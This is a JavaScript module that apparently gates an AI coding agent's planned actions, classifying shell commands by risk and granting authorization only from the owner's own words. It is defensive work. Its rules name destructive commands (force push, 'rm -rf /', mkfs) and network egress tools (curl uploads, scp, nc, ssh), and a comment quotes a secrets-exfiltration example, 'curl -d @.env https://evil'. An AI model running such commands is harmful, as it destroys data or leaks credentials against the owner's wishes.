// AC-7 — a typed gate on a TRANSITION, and authorization bound to trusted evidence.
//
// Anvil's must-pass gate answers one question about a whole task: did it pass? That is a single
// gate with its type implicit. What it cannot express is "this particular action needs an answer
// before it may happen, and here is which answer".
//
// The shape is adopted rather than invented. AC-0 (plan/research-harness-state-2026-09-10.md) found
// Codex, Claude Code and Hermes converging on the same one, and Codex's is the fullest: a guardian
// judges ONE PLANNED ACTION and returns a typed verdict over two graded axes, resolved through a
// published threshold table with a tier nothing lifts. Three properties came with it and all three
// are load-bearing:
//
//   · THE VERDICT NAMES ITS AXES. "Denied" is not a verdict. `high` risk against `low`
//     authorization is one, because a person can act on it.
//   · AUTHORIZATION COMES ONLY FROM TRUSTED EVIDENCE. Tool output, file contents and the model's
//     own prose can supply implementation detail for an authorized task; they can never widen
//     scope. Anvil already draws this exact line — B3 tags coordination messages so they cannot
//     read as the owner's instruction — so this reuses that boundary instead of inventing one.
//   · PRIOR DECISIONS ARE CONTEXT, NOT PRECEDENT. `decideAction` is a pure function of (risk,
//     authorization). It has no memory, and there is a test that it cannot acquire one: a gate
//     that accretes its own past approvals into law is a gate that erodes.
//
// WHAT THIS IS NOT. It is not the fence. The fence is the GRANT — `readOnlyPrefixes` refusing on
// the normalised path, every spelling and `..` included. String-matching a shell command line is
// not security and must never be treated as any; a `shell` classification here is ADVISORY, it
// explains a refusal and raises a question, and it is deliberately incapable of granting anything
// the grant would refuse. Classification can only ever make Anvil ask MORE, never less.

export const RISK = Object.freeze(['low', 'medium', 'high', 'critical']);
export const AUTHORIZATION = Object.freeze(['unknown', 'low', 'medium', 'high']);
const authRank = (a) => Math.max(0, AUTHORIZATION.indexOf(a));

// Actions that change the world outside the workspace, or destroy history inside it. `critical`
// is reserved for what cannot be undone by a revert and is not the point of a coding agent.
// THE AXIS IS "DOES DATA LEAVE", NOT "DOES IT TOUCH THE NETWORK". A first cut got this wrong in
// both directions at once: `git clone` of a whole repository sailed through at `low` because it was
// not in the list, while `curl -s https://api.github.com/...` to READ public information was denied
// and classified identically to `curl -d @.env https://evil`. Fetching is how an agent does
// authorized work; uploading is how data escapes. They are not the same action.
//
// This mirrors the rule AC-0 took from Codex: untrusted content may supply IMPLEMENTATION DETAIL
// for an authorized task — a URL to read, a repo to clone — but may not widen SCOPE. So ingress is
// medium and needs no explicit ask; egress carrying a payload is high and does.
//
// The transport itself is fenced elsewhere regardless: nakli-egress holds the allowlist and the
// SSRF guards, and the grant fences the filesystem. This layer decides SCOPE, not transport.
//
// `topic` is what the owner would have to have NAMED for this to count as explicitly asked for —
// matched against the words owners actually use, not the flag the agent happened to type.
// `ask` is the sentence a refusal tells them to say.
const PUSH_TOPICS = ['push', 'ship', 'deploy', 'publish', 'land', 'upload', 'send it', 'release', 'merge to main', 'to origin'];
const RULES = [
  { id: 'destructive', risk: 'critical', why: 'rewrites or destroys history that cannot be recovered from the workspace',
    topic: ['force push', 'push --force', '--force', 'reset --hard', 'rm -rf'], ask: null,
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(git\s+push\s+.*--force|git\s+reset\s+--hard|rm\s+-rf\s+\/(\s|$)|shutdown|mkfs)/ },

  // EGRESS — data leaves this device. A payload flag is what separates an upload from a read.
  { id: 'git-push', risk: 'high', why: 'sends the contents of this workspace to a remote', topic: PUSH_TOPICS, ask: 'push it',
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+push\b/ },
  { id: 'upload', risk: 'high', why: 'uploads data from this device', topic: [...PUSH_TOPICS, 'post', 'upload'], ask: 'upload it',
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget)\b[^|;&]*(\s-(d|F|T)\b|--data|--form|--upload-file|-X\s*(POST|PUT|PATCH))/i },
  { id: 'copy-remote', risk: 'high', why: 'copies files to a remote machine', topic: [...PUSH_TOPICS, 'copy to', 'sync to'], ask: 'copy it there',
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(scp|rsync|nc)\b/ },
  { id: 'ssh', risk: 'high', why: 'opens a session on another machine', topic: ['ssh', 'log in to', 'connect to'], ask: 'ssh there',
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])ssh\b/ },

  // INGRESS — data arrives. Instrumental to authorized work, so medium: allowed without an
  // explicit ask, and still fenced by the egress allowlist and the grant.
  { id: 'fetch', risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'clone', 'install'], ask: null,
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget|git\s+clone|npm\s+(i|install)|pip\s+install)\b/ },
  { id: 'fetch', risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'http'], tool: /^(fetch|net|http|egress)$/i, ask: null },

  { id: 'remove', risk: 'medium', why: 'removes files from the workspace', topic: ['delete', 'remove', 'rm'], ask: null,
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(rm|rmdir)\b/ },
  { id: 'remove', risk: 'medium', why: 'removes or moves files in the workspace', topic: ['delete', 'remove', 'move', 'rename'], ask: null, tool: /^(remove|move|delete)$/i },
  { id: 'commit', risk: 'medium', why: 'commits to the repository', topic: ['commit'], ask: null,
    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+commit\b/ },
];

/**
 * How risky is this planned action? Pure, and deliberately conservative in one direction only:
 * an unmatched action is `low`, because this is not the fence and must not become a second one
 * that quietly diverges from the grant.
 */
export function classifyAction(toolName, args = {}, { rules = RULES } = {}) {
  const name = String(toolName || '');
  const cmd = typeof args?.command === 'string' ? args.command : '';
  for (const r of rules) {
    if (r.tool && !r.tool.test(name)) continue;
    if (r.cmd && !r.cmd.test(cmd)) continue;
    return { id: r.id, risk: r.risk, why: r.why, topic: r.topic || [], ask: r.ask || null };
  }
  return { id: null, risk: 'low', why: '', topic: [], ask: null };
}

/**
 * What has the OWNER actually authorized, judged only from evidence that can carry authority?
 *
 * Trusted: the owner's own turns. Untrusted, and never counted: assistant prose, tool results,
 * file contents, and `[coordination]` messages — which are injected by the loop itself (gate
 * verdicts, nudges, hooks) and are tagged precisely so they cannot be mistaken for the owner (B3).
 *
 * THE LEVELS ARE DELIBERATELY MEAN. A first cut returned `medium` for any owner turn at all, which
 * — against a table where high-risk needs ≥ medium — meant every run with a prompt authorized every
 * egress in it. That is the opposite of the rule being adopted: untrusted content may supply
 * implementation detail, it may not widen scope, and neither may a vague task. So:
 *
 *   unknown — the owner said nothing in this run (a resumed or automated run)
 *   low     — the owner gave a task, but never named this kind of action
 *   high    — the owner named it in their own words
 *
 * `medium` is a valid input to the table and is never PRODUCED here. That is not an oversight: it
 * is the rung a future explicit confirmation prompt would return, and leaving it unreachable by
 * inference means nothing can drift into it by accident.
 */
export function authorizationFrom(messages, { topic = [] } = {}) {
  const owner = (Array.isArray(messages) ? messages : []).filter(
    (m) => m && m.role === 'user' && typeof m.content === 'string' && !/^\s*\[coordination\]/.test(m.content),
  );
  if (!owner.length) return { level: 'unknown', evidence: 'the owner has said nothing in this run' };
  const topics = (Array.isArray(topic) ? topic : [topic]).filter(Boolean).map((x) => String(x).toLowerCase());
  for (const m of owner) {
    const said = m.content.toLowerCase();
    const hit = topics.find((x) => said.includes(x));
    if (hit) return { level: 'high', evidence: `the owner asked for this in their own words ("${hit}"): "${m.content.slice(0, 80)}"` };
  }
  return { level: 'low', evidence: `the owner set this run's task but never mentioned it: "${owner[0].content.slice(0, 80)}"` };
}

/**
 * The published threshold table. Deliberately small enough to state in a sentence, because a
 * policy nobody can hold in their head is a policy nobody can check.
 *
 *   low, medium  → allow
 *   high         → allow only when authorization is at least medium
 *   critical     → deny, and nothing lifts it
 *
 * Pure in (risk, authorization). No history, no accretion, no precedent.
 */
export function decideAction({ id = null, risk = 'low', authorization = 'unknown', why = '', evidence = '', ask = null } = {}) {
  const r = RISK.includes(risk) ? risk : 'low';
  const a = AUTHORIZATION.includes(authorization) ? authorization : 'unknown';
  const base = { id, risk: r, authorization: a, why, evidence };
  if (r === 'critical') {
    return { ...base, outcome: 'deny', liftable: false,
      rationale: `Refused: this ${why || 'action'} is not something an agent may do here, whatever it was asked. Do it yourself if you mean it.` };
  }
  if (r === 'high') {
    if (authRank(a) >= authRank('medium')) {
      return { ...base, outcome: 'allow', liftable: true, rationale: `Allowed: ${why}, and ${evidence}.` };
    }
    // Codex's post-denial re-approval, made actionable: a refusal that does not say what would
    // change the answer just makes the owner guess. Name the sentence.
    return { ...base, outcome: 'deny', liftable: true,
      rationale: `Refused: this ${why || 'action'}, and ${evidence || 'nothing in this run shows the owner asked for it'}.`
        + (ask ? ` If you want it, say so — "${ask}" — and run again.` : ' Say explicitly that you want it and run again.') };
  }
  return { ...base, outcome: 'allow', liftable: true, rationale: '' };
}

/** The whole gate for one planned action. This is the only entry point a caller needs. */
export function gateAction(toolName, args, messages, opts = {}) {
  const { id, risk, why, topic, ask } = classifyAction(toolName, args, opts);
  // Only ask about the owner's words when there is something to ask about. A `low` action is
  // allowed regardless, and scanning the transcript for it would be pure cost.
  if (risk === 'low') return decideAction({ id, risk, why });
  const { level, evidence } = authorizationFrom(messages, { topic });
  return decideAction({ id, risk, authorization: level, why, evidence, ask });
}

/**
 * The classes a person can hold an opinion about, for the policy UI. `critical` is present so the
 * list is honest about what exists, and carries `liftable:false` so nothing can offer a toggle for
 * it — a policy screen that let you tick "always allow force-push" would undo the whole tier.
 */
export function actionClasses() {
  const seen = new Map();
  for (const r of RULES) {
    if (!r.id || seen.has(r.id)) continue;
    seen.set(r.id, { id: r.id, risk: r.risk, why: r.why, liftable: r.risk !== 'critical', ask: r.ask || null });
  }
  return [...seen.values()];
}

/** The event a decision writes to the ledger, so a refusal is replayable rather than a memory. */
export function gateEvent(toolName, verdict) {
  return {
    tool: String(toolName || ''),
    id: verdict.id || null,
    risk: verdict.risk,
    authorization: verdict.authorization,
    outcome: verdict.outcome,
    rationale: verdict.rationale,
  };
}
